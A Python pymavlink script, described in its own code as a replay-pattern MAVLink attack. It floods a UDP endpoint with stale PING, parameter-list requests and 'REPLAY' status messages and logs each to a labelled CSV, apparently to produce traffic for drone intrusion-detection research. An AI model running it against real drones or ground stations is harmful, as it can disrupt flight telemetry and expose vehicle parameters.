import argparse
import csv
import time
from datetime import datetime, timezone
from pathlib import Path

from pymavlink import mavutil


def build_parser():
    parser = argparse.ArgumentParser(description="Replay-pattern MAVLink attack.")
    parser.add_argument("--udp", default="127.0.0.1:14550", help="Host:port for udpout.")
    parser.add_argument("--rate", type=float, default=120.0, help="Replay iterations per second.")
    parser.add_argument("--duration", type=float, default=10.0, help="Seconds to run.")
    parser.add_argument("--out-dir", default=None, help="Output directory for CSV.")
    return parser


def main():
    args = build_parser().parse_args()
    out_dir = Path(args.out_dir) if args.out_dir else Path(__file__).resolve().parents[1] / "out"
    out_dir.mkdir(exist_ok=True)

    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    out_path = out_dir / f"attack_replay_pattern_{ts}.csv"

    conn = mavutil.mavlink_connection(f"udpout:{args.udp}")
    conn.mav.srcSystem = 240
    conn.mav.srcComponent = 1

    period = 1.0 / max(args.rate, 1.0)
    start = time.time()
    seq = 0
    replay_time = 111111111
    replay_seq = 4242

    with out_path.open("w", newline="", encoding="utf-8") as fh:
        writer = csv.writer(fh)
        writer.writerow(["timestamp", "msg_name", "msg_id", "seq", "pattern"])

        while time.time() - start < args.duration:
            conn.mav.ping_send(replay_time, replay_seq, 1, 1)
            writer.writerow([time.time(), "PING", mavutil.mavlink.MAVLINK_MSG_ID_PING, seq, "stale_ping"])

            conn.mav.param_request_list_send(1, 1)
            writer.writerow([time.time(), "PARAM_REQUEST_LIST", mavutil.mavlink.MAVLINK_MSG_ID_PARAM_REQUEST_LIST, seq, "fixed_sequence"])

            conn.mav.statustext_send(mavutil.mavlink.MAV_SEVERITY_INFO, b"REPLAY")
            writer.writerow([time.time(), "STATUSTEXT", mavutil.mavlink.MAVLINK_MSG_ID_STATUSTEXT, seq, "fixed_sequence"])

            seq += 1
            time.sleep(period)


if __name__ == "__main__":
    main()
